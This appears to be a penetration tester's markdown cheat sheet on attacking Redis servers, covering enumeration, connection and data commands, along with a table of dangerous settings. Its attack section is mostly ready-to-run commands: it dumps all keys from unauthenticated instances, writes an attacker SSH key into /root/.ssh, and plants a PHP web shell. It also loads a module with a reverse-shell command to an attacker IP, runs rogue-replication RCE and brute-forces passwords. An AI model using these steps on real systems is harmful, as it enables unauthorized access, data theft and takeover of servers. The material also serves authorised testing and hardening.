#Redis #database #inmemory #nosql

## What is Redis?
Remote Dictionary Server — open-source in-memory data structure store. Used as database, cache, and message broker. No authentication by default in older versions. Runs as root in many deployments.

- Port: **TCP 6379** (default), **TCP 6380** (TLS)
- Config file: `/etc/redis/redis.conf` or `/etc/redis.conf`
- Default bind: `127.0.0.1` (modern), `0.0.0.0` (older/misconfigured)

---

## Enumeration

```bash
# Nmap
nmap -p 6379 --script redis-info -sV <target>

# Check if open + unauthenticated
redis-cli -h <target> ping

# Metasploit
use auxiliary/scanner/redis/redis_server
```

---

## Connect / Access

```bash
# Connect (no auth)
redis-cli -h <target>

# Connect with password
redis-cli -h <target> -a <password>
redis-cli -h <target> -p 6379

# Authenticate after connecting
AUTH <password>
```

---

## Key Commands

```bash
# Server info
INFO
INFO server
INFO keyspace

# Config
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET requirepass

# Key operations
KEYS *
KEYS user*
TYPE <key>
GET <key>
SET <key> <value>
HGETALL <key>    # hash
LRANGE <key> 0 -1  # list
SMEMBERS <key>   # set

# Database
SELECT 0         # switch to db 0 (0-15)
DBSIZE
FLUSHDB          # clear current db
FLUSHALL         # clear all dbs

# Save
BGSAVE
SAVE
LASTSAVE
```

---

## Attack Vectors

### Unauthenticated Access — Data Dump

```bash
redis-cli -h <target> KEYS '*'
redis-cli -h <target> GET <key>

# Dump all keys and values
redis-cli -h <target> --scan | while read key; do echo "=== $key ==="; redis-cli -h <target> GET "$key"; done
```

### Write SSH Authorized Keys

```bash
# Requires: Redis running as root or redis user with homedir, writable .ssh/
redis-cli -h <target>

# Set key value to our SSH public key
SET payload "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@kali\n\n"

# Configure Redis to save to SSH directory
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
BGSAVE
```

### Write Web Shell

```bash
redis-cli -h <target>

SET webshell "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

### RCE via Redis Modules (RedisModules-ExecuteCommand)

```bash
# Requires write access + ability to MODULE LOAD
# Build: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
# Transfer module.so to target or via SMB share, then:
MODULE LOAD /path/to/module.so
system.exec "id"
system.rev <attacker_ip> <port>
```

### Master/Slave Replication RCE (Redis 4.x/5.x)

```bash
# rogue-server: https://github.com/n0b0dyCN/redis-rogue-server
python3 redis-rogue-server.py --rhost <target> --lhost <attacker>
```

### Brute Force

```bash
hydra -P /usr/share/wordlists/rockyou.txt redis://<target>

# Metasploit
use auxiliary/scanner/redis/redis_login
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No `requirepass` | Unauthenticated access to all data |
| `bind 0.0.0.0` | Exposed to network |
| Running as root | SSH key write = root shell |
| Writable web dir | Web shell via CONFIG SET |
| `protected-mode no` | Auth bypass on older versions |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check if open | `redis-cli -h host ping` |
| Connect | `redis-cli -h host` |
| Dump all keys | `redis-cli -h host KEYS '*'` |
| Server info | `redis-cli -h host INFO` |
| Get config | `redis-cli -h host CONFIG GET *` |
| Write SSH key | `CONFIG SET dir /root/.ssh` → `BGSAVE` |
| Write web shell | `CONFIG SET dir /var/www/html` → `BGSAVE` |
| Nmap enum | `nmap -p 6379 --script redis-info host` |
